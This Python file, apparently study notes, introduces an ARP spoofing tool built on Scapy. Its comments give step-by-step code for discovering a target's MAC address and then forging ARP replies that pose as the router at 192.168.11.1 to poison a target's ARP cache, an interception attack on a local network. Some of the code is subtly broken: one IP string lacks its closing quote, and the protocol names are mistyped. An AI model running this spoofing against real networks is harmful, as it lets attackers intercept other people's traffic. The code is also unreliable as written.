#ARP Spoofer tool 2021.

# --- Libraries ---
from scapy.all import *

#USING SCAPY
# Scapy allows us to create packets (pcp, udp, icp, arp)

# e.g. In terminal, run Scapy (scapy).
# Show commands: ls(ARP)
# Create packet: "packet = ARP(pdst="192.168.1.1")"
# Show packet: packet.show()

# Find target machine MAC address by sending packet
# (In Scapy:)
# broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
# arpLayer = ARP(pdst="192.168.11.110) #ip of target machine
# # arpLayer.show()
# entirePacket = broadcast/arpLayer
# # entirePacket.show()
# answer = srp(entirePacket, timeout=2, verbose=True)[0] # retrieves two lists: answered responses, unanswered machines
# print(answer[0][1].show)
# targetMAC = answer[0][1].hwsrc
# print(targetMAC)

## Create malicious ARP packet (present as router)
# op=2 tells target we are router/this is a response
# hwdst is target MAC
# pdst is target IP
# psrc is machine we impersonate, router (netstat -nr)
# packet = ARP(op=2, hwdst=targetMAC, pdst="192.168.11.110", psrc="192.168.11.1")
# send(packet, verbose=False)

# Router resets after a few seconds. Automated in arpspoofer.py
